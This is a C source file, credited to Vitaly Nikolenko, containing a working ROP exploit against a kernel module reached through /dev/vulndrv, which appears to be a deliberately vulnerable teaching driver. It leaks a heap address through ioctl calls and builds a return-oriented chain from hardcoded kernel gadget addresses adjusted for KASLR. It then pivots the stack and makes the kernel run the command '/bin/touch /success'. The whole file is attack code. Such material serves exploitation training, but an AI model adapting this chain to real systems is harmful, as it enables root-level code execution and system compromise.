/** 
 * ROP exploit for drv.c kernel module
 *
 * gcc rop_exploit.c -O2 -o rop_exploit
 *
 * Email: vnik@cyseclabs.com
 * Vitaly Nikolenko
 */

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include "drv.h"

#define DEVICE_PATH "/dev/vulndrv"


#define PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET 0xffffffff81556cad
//#define PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET 0xffffffff81567f46

#define POP_RAX_RET 0xffffffff8103d0b1
#define POP_RDI_RET 0xffffffff8108efa0
#define JMP_RAX 0xffffffff8100005b
#define RUN_CMD 0xffffffff810ce470
#define DO_TASK_DEAD 0xffffffff810dc260

#define REMOTE_COMMAND "/bin/touch /success"


void usage(char *bin_name) {
	fprintf(stderr, "%s ops_offset_hex kaslr_offset_dec\n", bin_name);
}

int main(int argc, char *argv[]) {
	int fd;
	int res;
	unsigned long ops_addr;
	unsigned long allocated_addr;
	long kaslr_offset;
	struct drv_req req;
	uint64_t payload[20 + 1];
	uint64_t *cmd = payload;

	ops_addr  = strtoul(argv[1], NULL, 16);
	kaslr_offset  = strtoul(argv[2], NULL, 10);

	printf("gonna open\n");
	if ((fd = open(DEVICE_PATH, O_RDWR)) < 0) {
		perror("open\n");
	}

	printf("opened\n");
	
	allocated_addr = ((unsigned long)ioctl(fd, 1, 0) & 0xffffffff) | ((unsigned long)ioctl(fd, 2000, 0) << 32);
	printf("ops_addr %lu\n", ops_addr);
	printf("allocated_addr %lu\n", allocated_addr);
	printf("offset %ld\n", allocated_addr - ops_addr);
	req.offset = allocated_addr - ops_addr;

	// - The first long of the payload is a pointer to executable code that makes the stack pointer point to the rest of the payload.
	// - The executable code is called with (file, payload + 8) which maps to - rdi, rsi (https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf page 20)
	//   and the rsb is set to a pointer to a random buffer that we can modify as we wish.
	// - We want to move the value of RSI to RSP
	*cmd++ = kaslr_offset +
      PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET;
	*cmd++ = 0xDEADBEEF;
	*cmd++ = kaslr_offset + POP_RAX_RET;
	*cmd++ = kaslr_offset + RUN_CMD;
	*cmd++ = kaslr_offset + POP_RDI_RET;
	*cmd++ = (unsigned long) (allocated_addr + (10 * 8));
	*cmd++ = kaslr_offset + JMP_RAX;
	*cmd++ = kaslr_offset + POP_RAX_RET;
	*cmd++ = kaslr_offset + DO_TASK_DEAD;
	*cmd++ = kaslr_offset + JMP_RAX;
	strncpy((char *)cmd, REMOTE_COMMAND, strlen(REMOTE_COMMAND));

	if ((res = write(fd, payload, sizeof(payload))) != 160 + 8) {
		perror("write\n");
	}
	
	ioctl(fd, 0, &req);

	return 0;
}
